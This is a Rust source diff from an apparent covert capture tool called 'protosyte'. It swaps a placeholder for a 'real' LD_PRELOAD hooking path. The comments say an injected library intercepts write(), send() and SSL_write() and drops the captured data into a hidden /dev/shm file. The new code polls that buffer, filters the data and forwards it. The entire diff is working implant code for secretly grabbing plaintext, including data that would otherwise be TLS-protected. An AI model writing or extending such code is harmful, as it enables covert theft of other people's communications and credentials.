@@ -50,18 +50,67 @@ impl HookManager {
     }
     
     pub async fn start_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
-        // Memory-mapped ring buffer for data capture
-        let buffer_path = "/dev/shm/.psi_temp";
+        // Real LD_PRELOAD hooking implementation
+        // The hook_lib.so library intercepts write(), send(), SSL_write()
+        // and writes captured data to /dev/shm/.protosyte_hook
         
-        // In a real implementation, this would:
-        // 1. Set up LD_PRELOAD hook for library injection
-        // 2. Use ptrace to attach to target process
-        // 3. Hook libc functions (fwrite, send, SSL_write)
-        // 4. Filter data through patterns
-        // 5. Write to ring buffer
+        let buffer_path = "/dev/shm/.protosyte_hook";
         
-        // For now, simulate data capture with file monitoring
-        self.monitor_file_capture(tx).await;
+        // Open the shared memory buffer that the hook library writes to
+        self.monitor_hook_buffer(tx, buffer_path).await;
+    }
+    
+    async fn monitor_hook_buffer(&self, tx: mpsc::UnboundedSender<Vec<u8>>, buffer_path: &str) {
+        use tokio::fs;
+        use tokio::io::{AsyncReadExt, AsyncSeekExt};
+        
+        // Create or open the buffer file (hook library creates it)
+        let _ = fs::OpenOptions::new()
+            .create(true)
+            .read(true)
+            .write(false)
+            .open(buffer_path)
+            .await;
+        
+        let mut last_offset = 8u64; // Skip header (first 8 bytes = current offset)
+        
+        while self.active.load(std::sync::atomic::Ordering::Relaxed) {
+            if let Ok(mut file) = fs::File::open(buffer_path).await {
+                // Read current offset from header
+                if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(0)).await {
+                    let mut offset_bytes = [0u8; 8];
+                    if let Ok(8) = file.read_exact(&mut offset_bytes).await {
+                        let current_offset = u64::from_le_bytes(offset_bytes);
+                        
+                        if current_offset > last_offset {
+                            // Read new data
+                            if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(last_offset)).await {
+                                let data_size = (current_offset - last_offset) as usize;
+                                let mut buffer = vec![0u8; data_size];
+                                
+                                if let Ok(n) = file.read_exact(&mut buffer).await {
+                                    if n > 0 {
+                                        // Filter data (additional filtering beyond hook library)
+                                        if let Some(filtered) = self.filter_data(&buffer) {
+                                            let _ = tx.send(filtered);
+                                        }
+                                    }
+                                }
+                            }
+                            last_offset = current_offset;
+                            
+                            // Wrap around if buffer is full
+                            const BUFFER_SIZE: u64 = 1024 * 1024; // 1MB
+                            if last_offset >= BUFFER_SIZE {
+                                last_offset = 8; // Reset to after header
+                            }
+                        }
+                    }
+                }
+            }
+            
+            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
+        }
     }
     
     async fn monitor_file_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
